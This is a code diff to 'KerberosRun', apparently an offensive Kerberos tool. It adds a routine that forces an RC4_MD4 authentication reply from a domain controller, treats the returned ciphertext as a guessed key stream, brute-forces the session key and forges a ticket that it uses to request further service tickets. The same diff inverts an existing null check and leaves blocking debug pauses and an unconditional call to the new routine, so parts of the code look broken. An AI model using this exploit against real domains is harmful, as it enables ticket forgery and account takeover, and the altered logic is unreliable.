@@ -210,15 +210,15 @@ namespace KerberosRun
             
             KrbAsReq asReq = (Cert == null) ? tgt.CreateAsReq() : tgt.CreateAsReqWithCert();
 
-            KrbAsRep asRep = tgt.SendAsync(asReq).Result;
+            var result = tgt.SendAsync(asReq).Result;
 
-            if (asRep == null)
+            if (result is KrbAsRep asRep)
             {
                 tgt.authOptions |= AuthenticationOptions.PreAuthenticate;
 
                 asReq = (Cert == null) ? tgt.CreateAsReq() : tgt.CreateAsReqWithCert();
 
-                asRep = tgt.SendAsync(asReq).Result;
+                result = tgt.SendAsync(asReq).Result;
             }
 
             tgt.DecryptAsRep();
@@ -229,8 +229,55 @@ namespace KerberosRun
             return tgt;
         }
 
+
+        public TGT RequestRC4MD4TGT()
+        {
+            var tgt = new TGT();
+
+            KrbAsReq asReq =  tgt.CreateAsReq(new[] { EncryptionType.RC4_MD4 }) ;
+
+            var result = tgt.SendAsync(asReq).Result;
+
+
+            if (result is KrbAsRep asRep)
+            {
+                asReq = tgt.CreateAsReqUsingRC4MD4(asRep.EncPart.Cipher.ToArray());
+
+                result = tgt.SendAsync(asReq).Result;
+
+                if (result is KrbAsRep asRepSucceed)
+                {
+                    Console.WriteLine("[!] Received valid KDC response with guessed key stream. Wait while I brute force some things...");
+
+                    var key = tgt.BruteForceKey();
+
+                    tgt.bKirbi = Kirbi.GetRC4MD4Kirbi(asRepSucceed, key);
+                    tgt.ticket = asRepSucceed.Ticket;
+                    tgt.DisplayTicket();
+
+                    Console.WriteLine("[*] Requesting a TGT with a more suitable key type.");
+
+                    var mykey = new KrbEncryptionKey { EType = EncryptionType.RC4_MD4, KeyValue = key };//, Usage = KeyUsage.Ticket };
+                    mykey.AsKey();
+                    Console.ReadLine();
+                    SPN = string.Join("/", asRepSucceed.Ticket.SName.Name);
+                    Ticket = tgt.ToKirbi();
+                    GetTGS(true);
+                }
+            }
+
+
+
+            return tgt;
+        }
+
+
         public int GetTGT(out TGT tgt, bool displayTicket = true)
         {
+            RequestRC4MD4TGT();
+
+            Console.WriteLine("_________________");
+            Console.ReadLine();
             //check if there's already a TGT from the previous AS/TGS exchange 
             if (KrbTGT != null) { tgt = KrbTGT; return 0; }
 
